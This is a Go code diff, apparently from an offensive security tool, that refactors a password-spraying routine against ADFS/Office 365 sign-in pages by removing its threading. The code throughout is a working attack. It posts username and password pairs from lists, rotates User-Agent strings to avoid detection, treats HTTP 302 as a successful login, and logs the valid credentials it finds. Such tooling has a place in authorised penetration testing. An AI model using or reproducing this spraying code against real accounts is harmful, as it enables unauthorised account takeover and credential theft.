@@ -25,47 +25,33 @@ func SprayADFSO365(
 	password string,
 	command string,
 	file *os.File,
-	threads int,
 ) {
-	semaphore := make(chan struct{}, threads)
-	var wg sync.WaitGroup
-	semaphore <- struct{}{}
-	wg.Add(1)
-	go func() {
-		defer func() {
-			<-semaphore
-			wg.Done()
-		}()
 
-		adfsLogin := url.Values{}
-		adfsLogin.Add("AuthMethod", "FormsAuthentication")
-		adfsLogin.Add("UserName", email)
-		adfsLogin.Add("Password", password)
-		loginURL := strings.Replace(authURL, "UsErNaMe%40"+domainName, email, 1)
-		client := &http.Client{
-			CheckRedirect: func(req *http.Request, via []*http.Request) error {
-				return http.ErrUseLastResponse
-			}}
-		req, err := http.NewRequest("POST", loginURL, strings.NewReader(adfsLogin.Encode()))
-		req.Header.Add("User-Agent", constants.USER_AGENTS[rand.Intn(len(constants.USER_AGENTS))])
-		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-		resp, err := client.Do(req)
-		if err != nil {
-			log.Fatalln(err)
-		}
-		defer resp.Body.Close()
-		if resp.StatusCode == 302 {
-			go sprayCounter()
-			color.Green("[+] Valid Credential : " + email + " - " + password)
-			logging.LogSprayedAccount(file, email, password)
-		}
-		if resp.StatusCode != 302 && command == "standalone" {
-			color.Red("[+] Invalid Credential : " + email + " - " + password)
-		}
-
-	}()
-
-	wg.Wait()
+	adfsLogin := url.Values{}
+	adfsLogin.Add("AuthMethod", "FormsAuthentication")
+	adfsLogin.Add("UserName", email)
+	adfsLogin.Add("Password", password)
+	loginURL := strings.Replace(authURL, "UsErNaMe%40"+domainName, email, 1)
+	client := &http.Client{
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		}}
+	req, err := http.NewRequest("POST", loginURL, strings.NewReader(adfsLogin.Encode()))
+	req.Header.Add("User-Agent", constants.USER_AGENTS[rand.Intn(len(constants.USER_AGENTS))])
+	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+	resp, err := client.Do(req)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 302 {
+		go sprayCounter()
+		color.Green("[+] Valid Credential : " + email + " - " + password)
+		logging.LogSprayedAccount(file, email, password)
+	}
+	if resp.StatusCode != 302 && command == "standalone" {
+		color.Red("[+] Invalid Credential : " + email + " - " + password)
+	}
 }
 
 func SprayEmailsADFSO365(
@@ -124,7 +110,6 @@ func SprayEmailsADFSO365(
 					scanner.Text(),
 					"file",
 					logFile,
-					threads,
 				)
 				time.Sleep(time.Duration(delay))
 			}
@@ -154,7 +139,6 @@ func SprayEmailsADFSO365(
 					password,
 					"file",
 					logFile,
-					threads,
 				)
 				time.Sleep(time.Duration(delay))
 			}
@@ -196,7 +180,6 @@ func SprayEmailsADFSO365(
 						passScanner.Text(),
 						"file",
 						logFile,
-						threads,
 					)
 					time.Sleep(time.Duration(delay))
 				}
